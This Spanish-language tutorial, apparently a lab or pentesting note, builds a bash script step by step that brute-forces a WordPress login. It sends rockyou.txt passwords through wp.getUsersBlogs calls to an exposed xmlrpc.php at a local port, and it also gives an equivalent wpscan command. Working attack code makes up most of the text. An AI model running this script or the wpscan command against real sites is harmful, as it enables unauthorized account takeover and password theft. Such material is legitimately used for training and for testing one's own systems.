
---

Tras realizar una enumeración manual y detectar un usuario válido. Y haber usado `curl` e internet para localizar el formato válido de solicitud. Podemos realizar un script de fuera bruta para detectar una contraseña.

Esto es posible ya que el archivo **xmlrcp.php** se encuentra accesible.

SCRIPT Fuerza Bruta:

```bash 
nvim xmlrcp_bruceForze.sh
```

Script por partes: 

1º Queremos recorrer una lista de contraseñas como es el rockyou.txt 

2º Como es una lista larga y podemos cancelar para tener una salida limpia creamos una función de salida

```bash 
#!/bin/bash 

function ctrl_c(){
	echo -e "\n\n[!] Saliendo...\n"
	exit 1
}

# Ctrl+C 
trap ctrl_c SIGINT

cat /usr/share/wordlists/rockyou.txt | while read password; do 

done
```

3º Queremos crear una estructura .xml para la contraseña que enviamos, necesitamos crear la función que cree el archivo con la solicitud indicada anteriormente:

```bash 
function createXML(){
	password=$1
	
	xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>USUARIO_CAMBIAR_POR_EL_DETECTADO</value></param> 
<param><value>$password</value></param> 
</params> 
</methodCall>
	"""

cat /usr/share/wordlists/rockyou.txt | while read password; do 
	createXML $password 
done
```

4º Tenemos que almacenar cada respuesta 

5º Enviar la solicitud POST como indicábamos antes:
 
```bash 
function createXML(){
	password=$1
	
	xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>USUARIO_CAMBIAR_POR_EL_DETECTADO</value></param> 
<param><value>$password</value></param> 
</params> 
</methodCall>
	"""
	
	echo $xmlFile > file.xml 
	
	curl -s -X POST "http://127.0.0.1:31337/xmlrpc.php" -d@file.xml
}
cat /usr/share/wordlists/rockyou.txt | while read password; do 
	createXML $password 
done
```

Si ejecutamos el script tal que así, veremos que las respuestas erróneas nos muestra un texto que se repite y el cual podemos filtrar con un condicional

6º Enviar solicitudes y filtrar por la que no sea errónea:

```bash 
function createXML(){
	password=$1
	
	xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>USUARIO_CAMBIAR_POR_EL_DETECTADO</value></param> 
<param><value>$password</value></param> 
</params> 
</methodCall>
	"""
	
	echo $xmlFile > file.xml 
	
	response=$(curl -s -X POST "http://127.0.0.1:31337/xmlrpc.php" -d@file.xml)

	if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
		echo -e "\n[+] La contraseña para el usuario indicado es: $password"
		exit 0
	fi 
}
cat /usr/share/wordlists/rockyou.txt | while read password; do 
	createXML $password 
done
```

Con este script detectaríamos lo mismo que `wpscan` cuándo hacíamos esto:

```bash 
wpscan --utl http://127.0.0.1:31337 -U USUARIO_DETECTADO -P /usr/share/wordlists/rockyou.txt 
```

---

## Script completo

```bash
#!/bin/bash 

function ctrl_c(){
	echo -e "\n\n[!] Saliendo...\n"
	exit 1
}

# Ctrl+C 
trap ctrl_c SIGINT

function createXML(){
	password=$1
	
	xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>USUARIO_CAMBIAR_POR_EL_DETECTADO</value></param> 
<param><value>$password</value></param> 
</params> 
</methodCall>"""
	
	echo $xmlFile > file.xml 
	
	response=$(curl -s -X POST "http://127.0.0.1:31337/xmlrpc.php" -d@file.xml)

	if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
		echo -e "\n[+] La contraseña para el usuario indicado es: $password"
		exit 0
	fi 
}
cat /usr/share/wordlists/rockyou.txt | while read password; do 
	createXML $password 
done
```

---
